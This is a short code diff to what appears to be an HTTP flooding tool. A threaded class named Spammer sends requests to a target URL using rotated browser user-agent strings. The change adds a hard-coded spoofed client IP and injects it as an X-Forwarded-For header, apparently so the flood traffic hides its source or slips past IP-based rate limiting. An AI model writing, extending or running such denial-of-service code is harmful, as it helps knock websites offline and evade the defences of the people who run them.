@@ -8226,7 +8226,8 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"	        			
 			]
 			
-
+# Spoofed client IP
+spoofed_ip = '1.3.3.9'
 
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
@@ -8244,6 +8245,7 @@ class Spammer(threading.Thread):
             'Cache-directive': 'no-cache',
             'Pragma': 'no-cache',
             'Upgrade-Insecure-Requests': '1',
+            'X-Forwarded-For': spoofed_ip,
         }
         self.Lock = threading.Lock()
         self.lista = lista
